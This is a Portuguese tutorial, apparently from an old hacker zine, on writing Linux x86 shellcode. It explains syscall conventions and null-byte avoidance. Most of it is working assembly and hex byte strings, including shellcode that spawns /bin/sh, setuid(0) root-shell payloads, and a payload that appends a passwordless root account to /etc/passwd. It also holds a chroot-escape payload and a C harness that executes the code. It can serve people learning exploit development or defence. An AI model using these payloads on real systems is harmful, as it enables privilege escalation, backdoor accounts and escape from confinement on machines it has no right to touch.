@@ -1,0 +1,1035 @@
++------------------ SHELLCODES -------------------+
+|                                                 |
+|   Escrito por finger a.k.a fingu                |
+|                                                 | 
+|   Este texto pode ser encontrado na minha       |
+|   pagina pessoal, aonde divulgarei outros       |
+|   trabalhos realizados por mim.                 |
+|                                                 |
+|    http://embranet.com/~fingu                   | 
+|                                                 |
+|                     <finger@whatever.org.ar>    |
++-------------------------------------------------+
+
+
+1. Intro
+2. Start
+   |-  2.1. shelltest
+   +-  2.2. systemcall
+3. Assembly
+   |-  3.1. estrutura da shellcode
+   |-  3.2. syscalls
+   |-  3.3. variaveis
+4. Shellcodes
+   |-  4.1. write()
+   |-  4.2. exit()
+   |-  4.3. nullbytes
+   |-  4.4. /bin/sh
+   |-  4.5. setuid()/setgid()
+   |-  4.6. open()/write()/close()   
+   |-  4.7. outro /bin/sh
+   |-  4.8. chroot()
+5. End
+
+
+1. __INTRODUCAO: 
+
+	Varias vulnerabilidades e tecnicas sao descobertas e surgem novos 
+exploits a cada dia. Nao irei explicar como fazer exploits neste tutorial, 
+mas sim uma parte importante para a criacao deles, a shellcode. Se 
+pretende comecar a fazer seus proprios exploits e' fundamental saber fazer 
+shellcodes, pois dependendo do que ira exploitar e' tera de usar 
+shellcodes diferentes. Se for exploitar um programa com buffer pequeno, 
+tera que fazer uma shellcode com menos bytes possivel. Se for exploitar 
+um programa que caira em uma shell presa em um diretorio com chroot, tera 
+que fazer uma shellcode para sair desse diretorio. Enfim, sao varias 
+situacoes de exploitacao que exigem conhecimento sobre shellcodes. Nao 
+ensinarei ninguem aqui a ser um mestre em shellcodes, mas sim o basico 
+para a criacao delas. 
+	Caso queira entrar em contato comigo, mail finger@antisocial.com.
+	
+	Vamos la' ao que interessa!
+
+2. __START:
+
+	Explicarei aqui a criacao de shellcodes exemplificando com alguns 
+codes, para quem nunca estudou este assunto, vera que e' muito simples 
+construir uma shellcode. Recomendo que voce possua conhecimentos 
+basicos na linguagem asm. Vamos utilizar 2 ferramentas que serao 
+essenciais: o compilador NASM, caso nao o tenha, podera baixar em 
+www.cryogen.com/Nasm e o shelltest caso nao o tenha tambem, 
+disponibilizarei seu codigo logo abaixo.
+
+
+2.1. __SHELLTEST:
+
+	O que e' o shelltest? Shelltest nada mais faz do que ler um 
+arquivo binary flat-form e passar seus caracteres para hexadecimal. Vamos 
+utiliza-lo para ler os arquivos gerados pelo nasm e passa-lo para forma de 
+shellcode. 
+
+jimmy@w2x:~$ ./shelltest
+Shellcode Gen & test
+./shelltest <arquivo_bin>
+
+
+<--------> shelltest.c <-------->
+
+/* Coded by finger <finger@antisocial.com> */
+
+#include <stdio.h>
+#include <linux/types.h> // ahaha
+
+#define ERR -1
+
+int main (argc, argv, envp)
+   int argc;
+   char *argv[];
+   char *envp;
+{
+	FILE	*fd;
+	char	*shell;
+	char	(*ret)();
+	int	len;
+	__u8	c;
+	__u32	lbreak = 0;
+
+	if (argc != 2) {
+		fprintf(stderr,"Shellcode Gen & test\x0a");
+		fprintf(stderr,"./shelltest <arquivo_bin>\x0a");
+		exit (ERR);
+	}
+
+	if ( (fd = fopen (argv[1], "rb") ) == NULL) {
+		perror ("fopen");
+		exit (ERR);
+	}
+
+	fseek (fd, 0L, SEEK_END);
+	len = ftell(fd);
+	fseek (fd, 0L, SEEK_SET);
+
+	if ( !(shell = (char *) malloc(len))) {
+		perror ("malloc");
+		exit (ERR);
+	}
+
+	if ( fread(shell, 1, len, fd) != len) {
+		perror("fread");
+		exit (ERR);
+	}
+
+	fprintf(stderr,"Bytes: %d\n",len);
+
+	printf("\nchar shellcode[] = \n\"");
+
+	ret = (char (*)())shell;
+
+	while(c = *shell++) {
+		len--;
+		printf("\\x%02x", c);
+
+		if(lbreak++ == 13) {
+			printf("\"\n\"");
+			lbreak-=lbreak;
+		}
+	}
+
+	printf("\";\n\n");
+
+	if (len > 0) {
+		printf("\n\nNull byte detectado\n");
+		exit (ERR);
+	}
+
+	printf("int main() {\n");
+	printf("void (*ret)() = (void *)shellcode;\n");
+	printf("  ret();\n");
+	printf("}\n");
+
+	fprintf(stderr,"\n\nTestar shellcode? (s/n) ");
+	if (getchar() == 's')
+		(*ret)();
+	else
+
+	fclose(fd);
+	exit(1);
+}
+
+<--------> shelltest.c <-------->
+
+
+2.2. __SYSTEMCALLS:
+
+	Shellcodes sao instrucoes que executam chamadas de sistema. Sao 
+essas chamadas de sistema que podemos fazer tudo em um sistema operacional 
+linux, ler arquivos, escrever em arquivos, executar programas etc. Aqui 
+irei explicar como construir diversas shellcodes com diversas funcoes, 
+utilizando variadas syscalls. As mais utilizadas chamadas de sistema em 
+shellcodes sao:
+
+open (const char *pathname, int flags, mode_t mode);
+-> Usado para abrir arquivos
+
+write (int fd, const void *buf, size_t n);
+-> Usado para escrever em arquivos
+
+read (int fd, void *buf, size_t count);
+-> Usado para ler arquivos
+
+execve (const  char  *filename, char *const argv [], char *const envp[]);
+-> Usado para executar arquivos
+
+setuid (uid_t uid);
+-> Usado para setar certo uid 
+
+setgid (gid_t gid);
+-> Usado para pegar certo gid 
+
+exit (int status);
+-> Usado para poder sair 
+
+chroot (const char *path);
+chdir (const char *path);
+-> Usados para retornar ao diretorio root
+
+dup2(int oldfd, int newfd);
+socket(int domain, int type, int protocol);
+-> Usado para operacoes com sockets
+
+
+Como disse, voce pode utilizar qualquer chamada de sistema em uma
+shellcode. Existem varias shellcodes, ja vi ate com chamadas como ptrace.
+Caso queira a listagem completa delas com seus respectivos numeros veja o
+arquivo /usr/include/asm/unistd.h. 
+
+
+3. __ASSEMBLY:
+
+	Todos as nossas shellcodes serao escritas em assembly. Embora 
+estamos escrevendo para linux, a sintaxe nao sera at&t pois estaremos 
+utilizando o compilador nasm. Caso queira se aprofundar mais em assembly, 
+procure por textos na pagina linuxassembly.org. Julgo essencial 
+ter conhecimentos basicos de linux asm para poder ter um entendimento 
+melhor do que irei realizar aqui.
+
+
+3.1. __ESTRUTURA_DA_SHELLCODE:
+
+	Nossa shellcode funcionara mais ou menos da seguinte maneira:
+
+BITS 32
+
+jmp short       __end
+
+__start:
+	pop 	registrador
+
+	Aqui	contera
+	os	codigos
+	em	assembly
+	para	a execucao
+	de	nossa shellcode
+
+__end:
+call            __start
+db		'espaco que iremos utilizar para armazenar dados'
+
+Por que os labels? o jmp? e o call?
+Quando exploitarmos um programa, nao saberemos em que espaco da memoria 
+ficara a nossa string que vamos utilizar para armazenar os dados. A 
+possivel solucao para isso sao o jmp e call descrito acima. Se colocarmos 
+o call antes da string chamando para o inicio da funcao, que comecara com 
+pop, podemos salvar a string dentro do registrador que definimos (pop 
+registrador). Mais a frente vamos exemplicar o que expliquei agora, entao 
+as coisas ficarao mais claras a voce.
+
+
+3.2. __SYSCALLS:
+
+	Para chamarmos certa systemcall em assembly, devemos carregar seus
+argumentos nos registradores e depois chamar a interrupcao 0x80. O esquema
+seria assim:
+
+	EAX = numero da systemcall
+	EBX = argumento 1
+	ECX = argumento 2
+	EDX = argumento 3
+	ESI = argumento 4
+	EDI = argumento 5
+
+Voce pode observar que podemos utilizar somente 5 argumentos se formos 
+armazena-los em cada registrador. Caso tenha que utilizar mais argumentos 
+ai ja teria que fazer um esquema totalemente diferente, o que nao 
+explicarei neste texto pois nao vamos utiliza-lo. Ha systemcalls que 
+necessitam de mais de 5 argumentos, como o mmap (nao sei como isso pode 
+ser util em uma shellcode, mas citei apenas para exemplificar). 
+
+Mas voltando ao nosso assunto acima, o que seria o 'numero da systemcall'? 
+Este e' o numero no qual o codigo identificara qual shellcodes estamos 
+chamando. Como disse acima, voce pode ve-los olhando o arquivo 
+/usr/include/asm/unistd.h de seu sistema. 
+
+...
+#define __NR_exit                 1
+#define __NR_read                 3
+#define __NR_write                4
+#define __NR_open                 5
+#define __NR_close                6
+#define __NR_execve              11
+#define __NR_chdir               12
+#define __NR_chroot              61
+#define __NR_setuid              23
+#define __NR_getuid              24
+...
+
+3.3. __VARIAVEIS:
+
+	Como vimos anteriormente na estrutura do nosso codigo de 
+shellcode, no final de nosso codigo ha a seguinte linha:
+
+db              'espaco que iremos utilizar para armazenar dados'
+
+Dentro destes ' ' nos podemos armazenar qualquer informacao, o que nos 
+servira para armazenar dados como se fossem variaveis. Esses dados irao 
+ser armazenados em um certo espaco da memoria, e vamos acessa-los atraves 
+do endereco que ficara guardado no registrador que setarmos na 
+funcao "pop" do inicio do programa. 
+
+Estes sao os fatos que voce precisa conhecer para comecarmos a construir 
+nossa shellcode (levando em consideracao que voce ja possue conhecimentos 
+minimos de assembly).
+
+
+4. __SHELLCODES:
+
+	Finalmente acabamos com essa enrolacao e vamos ao que realmente 
+interessa, a construcao de nossa primeira shellcode! Comecaremos 
+exemplificando o uso da syscall write.
+
+
+4.1. __WRITE():
+
+	Vamos criar uma shellcode que simplesmente mostre a string 
+"finger" na tela. Para isso, devemos utilizar a systemcall write:
+
+seu prototipo:
+write (int fd, const void *buf, size_t n);
+
+teremos de fazer write (1, "finger\n", 7);
+
+fd = 1
+buf = "finger\n"
+n = 7
+
+Em assembly para chamar esta funcao precisaremos que:
+
+EAX = 4        # Como explicamos logo acima, e' o numero da syscall write
+EBX = 1        # stdout
+ECX = Endereco da string
+EDX = 7        # Numero de bytes total da palavra "finger\n"
+
+e assim chamaremos a interrupcao 0x80 para executar a systemcall
+
+Nossa shellcode ficara assim:
+
+------ write.s ------
+
+BITS 32
+
+jmp short       __end            ; Pula para o final
+
+__start:
+ pop             ecx             ; ECX = Endereco da string finger$
+ xor             eax, eax        ; EAX = 0
+ mov byte        [ecx + 6], 0xa  ; Caracter '$' sera \n
+ mov byte        al, 0x4         ; AL = 4 (syscall write)
+ xor             ebx, ebx        ; ebx = 0
+ inc             ebx             ; ebx = 1 (stdout)
+ xor             edx, edx        ; edx = 0
+ mov byte        dl, 0x7         ; dl = 7 (tamanho da string)
+ int             0x80
+
+__end:
+call            __start
+ 
+db              'finger$'
+
+------ write.s ------
+
+Voce deve estar se perguntando porque coloquei esse 'finger$'. Esse 
+carater '$' sera substituido pela quebra de linha '\n' na seguinte funcao:
+
+mov byte        [ecx + 6], 0xa 
+
+0xa e' o caracter de quebra de linha, voce pode verificar com `man ascii`.
+Depois do pop ecx, o endereco da nossa string ficou gravado no registrador 
+ecx. Entao ecx + 6 sera '$' assim como ecx + 5 eh 'r', ecx + 4 eh 'e'...
+
+Criamos o arquivo write.s, agora vamos testa-lo utilizando as 2 
+ferramentas que citei no inicio deste texto, nasm e shelltest.
+
+finger@w2x:~$ nasm write.s
+
+Isso criara o arquivo 'write' que e' um binary flat form.
+
+finger@w2x:~$ ./shelltest write
+Bytes: 32
+
+char shellcode[] =
+"\xeb\x12\x59\x31\xc0\xc6\x41\x06\x0a\xb0\x04\x31\xdb\x43"
+"\x31\xd2\xb2\x07\xcd\x80\xe8\xe9\xff\xff\xff\x66\x69\x6e"
+"\x67\x65\x72\x24";
+
+int main() {
+void (*ret)() = (void *)shellcode;
+  ret();
+}
+
+
+Testar shellcode? (s/n) s
+finger
+finger
+finger
+finger
+....
+
+
+Se escolher testar shellcode, ele ira imprimir varios 'finger' em um loop 
+infinito. Veremos logo adiante como fazer para que isso nao ocorra. Mas o 
+fato e' que nossa shellcode esta funcionando como queriamos que ela 
+funcionasse. Voce pode testar ela em um programa .c tambem:
+
+finger@w2x:~$ ./shelltest write > w.c
+Bytes: 32
+
+
+Testar shellcode? (s/n) n
+finger@w2x:~$ gcc -o w w.c
+finger@w2x:~$ ./w
+finger
+....
+
+
+Observe na shellcode os ultimos codigos depois do ultimo 0xff:
+
+finger@w2x:~$ printf "\x66\x69\x6e\x67\x65\x72\x24"
+finger$jimmy@w2x:~$
+
+E' a nossa string 'finger$', isso significa que voce pode trocala na 
+shellcode se preferir:
+
+char shellcode[] =
+"\xeb\x12\x59\x31\xc0\xc6\x41\x06\x0a\xb0\x04\x31\xdb\x43"
+"\x31\xd2\xb2\x07\xcd\x80\xe8\xe9\xff\xff\xff"
+"finger$";
+
+
+4.2. __EXIT():
+
+	Essa systemcall e' utilizada em todos os tipos de shellcodes. 
+Lembra-se do problema que tivemos na nossa systemcall write logo acima de 
+entrar num loop infinito? Podemos resolver este problema chamando a funcao 
+exit. Seu uso e' muito simples:
+
+EAX = 1
+EBX = 0
+CHAMA 0x80
+
+ficaria assim:
+
+------ exit.s ------
+BITS 32
+mov 	        eax, 1         ; eax = 1
+xor             ebx, ebx       ; ebx = 0
+int             0x80           ; exit (0);
+------ exit.s ------
+
+Vamos simplesmente testa-lo para ver se esta tudo OK antes de inserirmos 
+em nossa shellcode:
+
+finger@w2x:~$ nasm exit.s
+finger@w2x:~$ ./shelltest exit
+Bytes: 9
+
+char shellcode[] =
+"\xb8\x01";
+
+
+
+Null byte detectado
+
+
+Temos um problema aqui, o shelltest detectou nullbytes em nossa shellcode. 
+Veremos a seguir o que e' e como resolver isso.
+
+
+4.3. __NULLBYTES:
+
+	Null bytes sao caracteres nulos que nao deixam com que nossa 
+shellcode execute quando ocorre um buffer overflow. A shellcode ira ser 
+percorrida e parara se encontrar um nullbyte. Este e' um problema que 
+devemos prestar bastante atencao. O programa shelltest verifica 
+automaticamente se ha nullbytes dentro de uma shellcode, verificamos logo 
+acima que ocorreu a detectacao de null bytes. Vejamos como e' isso.
+
+finger@w2x:~$ ndisasm exit
+00000000  B80100            mov ax,0x1
+00000003  0000              add [bx+si],al
+00000005  31DB              xor bx,bx
+00000007  CD80              int 0x80
+
+Veja os nullbytes nas seguintes linhas:
+00000000  B80100            mov ax,0x1
+00000003  0000              add [bx+si],al
+
+Observe B80100 e 0000, este pedaco de shellcode ficaria:
+\xb8\x01\x00 e \x00\x00
+
+Sao exatamente esses \x00 que sao os nossos nullbytes. Na nossa funcao 
+exit.s o problema ocorre na seguinte linha:
+
+mov             eax, 1
+
+Mas como podemos soluciona-lo?
+
+Existe varias formas para poder solucionar este problema nesta linha. 
+podemos fazer:
+
+mov byte        al, 1
+
+ou 
+
+xor             eax, eax
+inc             eax
+...
+
+Vamos utilizar o ultimo exemplo, pois ele possue um byte a menos que o 
+exemplo de cima. Quanto menor for nossa shellcode, melhor para exploitar, 
+principalmente casos especiais de buffers pequenos.
+
+Agora voce ja pode adicionar o codigo do exit no write.s que ficara:
+
+------ write.s ------
+
+BITS 32
+
+jmp short       __end             ; Pula para o final
+
+__start:
+ pop             ecx             ; ECX = Endereco da string finger$
+ xor             eax, eax        ; EAX = 0
+ mov byte        [ecx + 6], 0xa  ; Caracter '$' sera \n
+ 
+;  write (1, "finger\n", 7);
+ mov byte        al, 0x4         ; AL = 4 (syscall write)
+ xor             ebx, ebx        ; ebx = 0
+ inc             ebx             ; ebx = 1 (stdout)
+ xor             edx, edx        ; edx = 0
+ mov byte        dl, 0x7         ; dl = 7 (tamanho da string)
+ int             0x80
+
+; exit (0); 
+ xor             eax, eax       ; eax = 0
+ inc             eax            ; eax = 1
+ xor             ebx, ebx       ; ebx = 0
+ int             0x80           ; exit (0);
+
+__end:
+call            __start
+
+db              'finger$'
+
+------ write.s ------
+
+Agora e' so compilar com nasm e rodar com shelltest para ver que nossa 
+shellcode funciona perfeitamente como desejamos!
+
+
+4.4 __"/bin/sh":
+
+	A famosa shell /bin/sh no qual a maioria dos exploits utilizam em 
+suas shellcodes. Veremos agora como criar a shellcode para executarmos 
+/bin/sh. Para executarmos algum comando, vamos precisar utilizar a chamada 
+de sistema execve:
+
+execve(ponteiro p/ string /bin/sh, ponteiro p/ /bin/sh, ponteiro p/ NULL);
+
+A shellcode ficara assim:
+
+
+------ execve.s ------
+
+BITS 32
+
+jmp short       __end
+
+__start:
+
+ pop            esi
+ xor            eax, eax
+ mov byte       [esi + 7], al
+ lea            ebx, [esi]
+ mov long       [esi + 8], ebx
+ mov long       [esi + 12], eax
+ add            al, 0x0b
+ mov            ebx, esi
+ lea            ecx, [esi + 8]
+ lea            edx, [esi + 12]
+ int            0x80
+
+__end:
+call            __start
+db              '/bin/sh$XXXXNULL'
+
+------ execve.s ------
+
+Acalme-se, nao coloquei nenhum comentario pois explicarei agora 
+linha-por-linha. O que fizemos foi alocar a string '/bin/sh$XXXXNULL' em 
+um endereco da memoria e alocar este endereco dentro do registrador esi. 
+Atraves do registrador esi e' que obtivemos o endereco das strings para 
+inserir nos outros registradores. Vejamos:
+
+ pop            esi
+
+Guardamos o endereco da string '/bin/sh$XXXXNULL' em esi.
+
+ xor            eax, eax
+ mov byte       [esi + 7], al
+
+esi + 7 e' o caracter $ da string, observe abaixo para entender melhor:
+/bin/sh$XXXXNULL
+0123456789012345             Veja o 7 embaixo do caracter $
+
+O que fiz foi mover o valor de al que se tornou nulo por causa do comando 
+xor em al.
+
+ lea            ebx, [esi]
+
+Aqui inserimos o endereco de /bin/sh dentro do registrador ebx
+
+ mov long       [esi + 8], ebx
+
+Depois gravamos este endereco dentro da nossa string. Este endereco ficara 
+gravado no lugar do XXXX. Observe que colocamos 4 X's pois estamos 
+trabalhando com registradores de 4 bytes (32 bits).
+
+ mov long       [esi + 12], eax
+
+Agora gravamos uma string nula dentro de 'NULL'.
+veja que 8 e' o offset naonde comeca XXXX e 12 aonde comeca NULL.
+
+ add            al, 0x0b
+
+Adicionamos 0x0b em al, agora al = 11 que e' execve
+
+ mov            ebx, esi
+
+Pegamos nossa string /bin/sh e inserimos em ebx
+
+ lea            ecx, [esi + 8]
+
+Colocamos o endereco de /bin/sh que esta gravada em esi + 8 dentro do 
+segundo argumento, que e' ecx
+
+ lea            edx, [esi + 12]
+
+Por fim, colocamos nosso ponteiro p/ NULL dentro do ultimo argumento, edx
+
+ int            0x80
+
+Chamamos a systemcall execve()
+
+Vamos executa-la:
+
+
+finger@w2x:~$ nasm execve.s
+finger@w2x:~$ ./shelltest execve
+Bytes: 49
+
+char shellcode[] =
+"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89"
+"\x46\x0c\x04\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
+"\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x24\x58"
+"\x58\x58\x58\x4e\x55\x4c\x4c";
+
+int main() {
+void (*ret)() = (void *)shellcode;
+  ret();
+}
+
+
+Testar shellcode? (s/n) s
+sh-2.05$
+
+
+4.5. __SETUID()/SETGID():
+
+	Nos linuxes mais velhos poderiamos executar um exploit utilizando
+a shellcode acima que voce cairia numa shell root se o programa bugado
+local tivesse com setuid bit 0. Nos linuxes mais atuais, mesmo exploitando
+um programa (local) com setuid bit 0 mas utilizando essa shellcode, voce
+nao caira numa shell root. Para isso precisamos usar a systemcall
+setuid(0) antes de chamar nossa shell.
+
+setuid(uid_t uid);    Seu uso e' muito simples, basta setuid(0) 
+
+ficaria dessa forma:
+
+mov byte	al, 0x17	; 0x17 equivale a 23 em decimal
+				; que e' o numero da syscall setuid
+xor		ebx, ebx	; ebx = 0
+int		0x80		; setuid(0);
+
+Vamos inseri-la em nosso codigo do /bin/sh juntamente com mais a funcao 
+exit(0)
+
+------ execve1.s ------
+
+BITS 32
+
+jmp short       __end
+
+__start:
+
+ pop            esi		; endereco da string em esi
+ xor            eax, eax	; eax = 0
+ mov byte       [esi + 7], al	; esi + 7 = 0
+ lea            ebx, [esi]	; ebx = endereco de /bin/sh
+ mov long       [esi + 8], ebx  ; esi + 8 = endereco de /bin/sh
+ mov long       [esi + 12], eax ; esi + 12 = 0
+
+; setuid(0);
+ mov byte        al, 0x17        ; 0x17 equivale a 23 em decimal
+                                 ; que e' o numero da syscall setuid
+ xor             ebx, ebx        ; ebx = 0
+ int             0x80            ; setuid(0);
+
+; execve(sh[0], sh, NULL);
+ add            al, 0x0b
+ mov            ebx, esi
+ lea            ecx, [esi + 8]
+ lea            edx, [esi + 12]
+ int            0x80
+
+; exit (0);
+ xor             eax, eax       ; eax = 0
+ inc             eax            ; eax = 1
+ xor             ebx, ebx       ; ebx = 0
+ int             0x80           ; exit (0);
+
+__end:
+call            __start
+db              '/bin/sh$XXXXNULL'
+
+------ execve1.s ------
+
+finger@w2x:~$ nasm execve1.s
+
+Uma observacao: Nossa funcao contem setuid(0), se voce executar o 
+shelltest execve1 com um usuario que nao seja root, ele nao ira funcionar. 
+A nao ser que voce tenha setado setuid bit 0 para o shelltest.
+
+finger@w2x:~$ ./shelltest execve1
+
+Bytes: 62
+
+char shellcode[] =
+"\xeb\x27\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89"
+"\x46\x0c\xb0\x17\x31\xdb\xcd\x80\x04\x0b\x89\xf3\x8d\x4e"
+"\x08\x8d\x56\x0c\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8"
+"\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x24\x58\x58"
+"\x58\x58\x4e\x55\x4c\x4c";
+
+int main() {
+void (*ret)() = (void *)shellcode;
+  ret();
+}
+
+
+Testar shellcode? (s/n) s
+sh-2.05# id
+uid=0(root) gid=100(users) groups=100(users)
+sh-2.05# exit
+exit
+
+Observe que o uid e' 0 mas o gid e' 100. Para setar setgid 0, o 
+procedimento e' igual o do setuid, so muda o numero da systemcall de 0x17 
+para 0x2e, que e' a chamada para setgid.
+
+; setgid (0);
+mov byte        al, 0x2e
+xor             ebx, ebx      
+int             0x80        
+
+4.6. __OPEN()/WRITE()/CLOSE();
+
+	Nessa proxima shellcode iremos abrir um arquivo, escrever nele e 
+fecha-lo. Para isso precisamos executar as chamadas open, write e close. 
+Mostrarei o exemplo de uma shellcode que abre o arquivo /etc/passwd e 
+adiciona umas linhas "basicas" nele. Os procedimentos sao:
+
+open ("/etc/passwd", 1026);   // 1026 e' o flag append + read / write
+
+write (fd, "fingu::0:0:::/bin/sh", 20);  // fd eh o file descriptor
+
+close(fd);       // fecha arquivo
+
+Simples nao?
+
+
+------ pwdwrite.s ------
+
+BITS 32
+jmp short       __end
+
+__start:
+
+ pop            esi			; carrega 'variaveis' em esi
+ xor            eax, eax		; eax = 0
+ mov byte       [esi + 11], al		; caracter $ da string = 0
+ mov byte       [esi + 32], al		; caracater esi + 32 = 0
+ lea            ebx, [esi + 12]		; ebx = endereco de fingu::0...
+ mov long       [esi + 33], ebx		; coloca endereco em EEEE
+
+; open (arquivo, 1026);
+ mov byte       al, 0x5			; al = 5, syscall open
+ lea            ebx, [esi]		; ebx = /etc/passwd 
+ mov            cx, 1026		; modo de abertura 
+ int            0x80			; faca algo!
+
+; write(fd, string, len);
+ mov long       ebx, eax		; ebx = file descriptor do arquivo
+ mov            al, 4			; al = 4 syscall write
+ mov            ecx, [esi + 33]		; ecx = endereco da string
+ xor            edx, edx		; edx = 0
+ add            dx, 20			; edx = 20
+ int            0x80		
+
+; close(fd);
+ mov            al, 6			; al = 6 syscall exit
+ int            0x80			; ebx ja contem o file descriptor
+
+; exit(0);
+ mov            al, 0x01		; nao vou explicar denovo
+ xor            ebx, ebx		; a funcao exit
+ int            0x80			; duh!
+
+__end:
+call            __start
+
+db              '/etc/passwd$'
+db              'fingu::0:0:::/bin/sh$'
+db              'EEEE'
+
+------ pwdwrite.s ------
+
+Voce pode observar que fiz uma coisa diferente no final:
+
+db              '/etc/passwd$'
+db              'fingu::0:0:::/bin/sh$'
+db              'EEEE'
+
+coloquei 3 db ao inves de um contendo todo. Nao faz diferenca 1 ou 10 db 
+contendo a mesma string, poderia ter feito:
+
+db              '/etc/passwd$fingu::0:0:::/bin/sh$EEEE'
+
+que daria na mesma. 
+
+Vamos la, testando:
+
+finger@w2x:~$ nasm pwdwrite.s
+finger@w2x:~$ ./shelltest pwdwrite
+Bytes: 94
+
+char shellcode[] =
+"\xeb\x32\x5e\x31\xc0\x88\x46\x0b\x88\x46\x20\x8d\x5e\x0c"
+"\x89\x5e\x21\xb0\x05\x8d\x1e\x66\xb9\x02\x04\xcd\x80\x89"
+"\xc3\xb0\x04\x8b\x4e\x21\x31\xd2\x66\x83\xc2\x14\xcd\x80"
+"\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc9\xff\xff"
+"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x24\x66"
+"\x69\x6e\x67\x75\x3a\x3a\x30\x3a\x30\x3a\x3a\x3a\x2f\x62"
+"\x69\x6e\x2f\x73\x68\x24\x58\x58\x58\x58";
+
+int main() {
+void (*ret)() = (void *)shellcode;
+  ret();
+}
+
+Shellcode um pouco grandinha nao acha? Leia o codigo e veja o que voce 
+pode fazer para encurta-lo e construa sua propria shellcode com menos 
+bytes :)
+
+
+4.7. __OUTRO_/BIN/SH
+
+	Achei uma shellcode interessante feito por anathema. Essa 
+shellcode chama a funcao /bin/sh com execve assim como fizemos acima. Mas 
+ela tem uma coisa que me chamou atencao, possuem somente 25 bytes! E' bem 
+curtinha. Vejamos seu funcionamento:
+
+
+------ minishell.s ------
+
+BITS 32
+
+ sub             eax, eax
+ push            eax
+ push            0x68732f2f
+ push            0x6e69622f
+ mov long        ebx, esp
+ push            eax
+ mov long        edx, esp
+ push            esp
+ mov long        ecx, esp
+ mov byte        al, 0xb
+ int             0x80
+
+------ minishell.s ------
+
+Este e' um esquema diferente do que vimos a pouco tempo, por isso achei 
+interessante explicar as linhas com mais detalhes para que entendam.
+
+ sub             eax, eax
+
+Subtrai eax por eax. eax fica sendo 0
+
+ push            eax
+ push            0x68732f2f
+ push            0x6e69622f
+
+Aqui ele carrega os argumentos diretamente na stack. Push faz com que
+/bin/sh fique em esp. 0x68732f2f e 0x6e69622f e' a string /bin/sh, veja:
+
+finger@w2x:~$ printf "\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+/bin//sh
+
+ mov long        ebx, esp
+
+ebx e' o primeiro argumento, aonde ficara o /bin/sh. 
+
+ push            eax
+ mov long        edx, esp
+
+adiciona caracter nulo na pilha e o move para o ultimo argumento, edx
+
+ push            esp
+ mov long        ecx, esp
+
+Adiciona o valor de esp no topo da pilha e o coloca como o segundo 
+argumento.
+
+ mov byte        al, 0xb
+ int             0x80
+
+Essas voces ja sabem o que faz. al = valor da syscall execve, e int 0x80 
+para executa-la.
+
+finger@w2x:~$ nasm minishell.s
+finger@w2x:~$ wc minishell
+      0       2      25 sh
+
+Como voce pode observar, essa shellcode possue somente 25 bytes
+
+4.8. __CHROOT()
+
+	Em alguns exploits e' utilizado a funcao chroot, que serve para 
+alternar para diretorio root. Um exemplo e' o exploit para o wuftpd, que 
+se nao usarmos essa funcao na shellcode, ele ficara preso em um diretorio. 
+Para quebrarmos isso, temos que usar a seguinte funcao:
+
+chroot("../../../../../../../");
+
+isso fara com que caimos no diretorio raiz.
+
+Nosso codigo de chroot ficara assim:
+
+lea           ebx, [esi + offset]      ; ebx = endereco de ../../../...
+mov long      [esi + offset], ebx      ; esi + offset = end de /../...
+mov byte      al, 0x3d                 ; 0x3d = 61, syscall do chroot
+lea           ebx, [esi + offset]      ; ebx = ../../
+int           0x80
+
+vamos precisar armazenar a string '../../../../../../../' na memoria e 
+depois chamarmos com o lea.
+
+Aqui esta' o exemplo do execve com chroot:
+
+------ chroot.s ------
+
+BITS 32
+
+jmp short       __end
+
+__start:
+
+ pop            esi             ; endereco da string em esi
+ xor            eax, eax        ; eax = 0
+ mov byte       [esi + 7], al   ; esi + 7 = 0
+ lea            ebx, [esi]      ; ebx = endereco de /bin/sh
+ mov long       [esi + 8], ebx  ; esi + 8 = endereco de /bin/sh
+ mov long       [esi + 12], eax ; esi + 12 = 0
+ lea            ebx, [esi + 20] ; ebx = endereco de ../../../../
+ mov long       [esi + 16], ebx ; esi + 16 = endereco de ../../../
+
+; setuid(0);
+ mov byte        al, 0x17        ; 0x17 equivale a 23 em decimal
+                                 ; que e' o numero da syscall setuid
+ xor             ebx, ebx        ; ebx = 0
+ int             0x80            ; setuid(0);
+
+
+; chroot("../../../../../../../");
+ mov byte      al, 0x3d
+ lea           ebx, [esi + 16]
+ int           0x80
+
+; execve(sh[0], sh, NULL);
+ add            al, 0x0b
+ mov            ebx, esi
+ lea            ecx, [esi + 8]
+ lea            edx, [esi + 12]
+ int            0x80
+
+; exit (0);
+ xor             eax, eax       ; eax = 0
+ inc             eax            ; eax = 1
+ xor             ebx, ebx       ; ebx = 0
+ int             0x80           ; exit (0);
+
+__end:
+call            __start
+db              '/bin/sh$XXXXNULLCCCC'
+db              '../../../../../../../'
+
+------ chroot.s ------
+
+Eis o nosso code com chroot. Existem outras maneiras de quebrar chroot, 
+que vou ficar devendo para o proximo texto sobre shellcodes (isso se 
+houver!).
+
+
+5. __END:
+
+	Finalizo aqui meu texto sobre escritas de shellcodes. Gostaria de 
+poder escrever mais, mas vou guardar um pouco para quem sabe um proximo 
+texto sobre shellcodes. Ficarei devendo exemplos de shellcodes que 
+utilizam sockets, exploracao de outras chamadas de sistema etc. Mas creio 
+que com essas informacoes voce ja pode escrever shellcodes muito 
+interessantes e tambem inovar as que citamos aqui. 
+
+	Tem muitos textos de shellcodes por ai, se voce realmente se 
+interessou pelo assunto, corra atras, busque informacoes! 
+
+	Eu dedico este texto as pessoas que estao comecando a aprender 
+sobre o assunto, pode ver que existe muito mais do que esta' escrito aqui, 
+citei somente os passos basicos para a criacao de shellcodes.
+
+	Gostaria de mandar meus agradecimentos a Sammael, #sunos 
+dancers, #int80h dancers, #feanor dancers, #lahack dancers, [_Dama_], 
+esc2, module, rpc, s2k, aqu4lung, dr0pz, mor_ph_eus, hophet, The-Magic ... 
+enfim todos que me ajudaram e me ajudam ate hoje !
+
+UA
+		-- finger a.k.a fingu
